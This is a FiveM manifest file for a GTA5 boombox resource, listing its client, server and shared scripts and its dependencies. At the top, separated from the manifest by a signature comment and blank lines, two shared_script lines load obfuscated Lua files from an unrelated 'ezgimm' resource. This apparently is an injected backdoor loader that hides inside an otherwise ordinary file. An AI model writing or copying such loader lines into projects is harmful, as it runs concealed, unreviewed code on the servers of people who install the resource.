shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
-- ERDEM & MUSTAFA




 
 

fx_version "cerulean"
game "gta5"

description 'GGDev ESX/QB Boombox'
version '2.1.5'

lua54 'yes'

client_scripts {
    'client/**.lua'
}

server_scripts {
  '@mysql-async/lib/MySQL.lua',
  'server/**.lua',
}

shared_scripts {
  '@ox_lib/init.lua',
  'config.lua'
}

dependencies {
  'xsound',
  'ox_lib'
}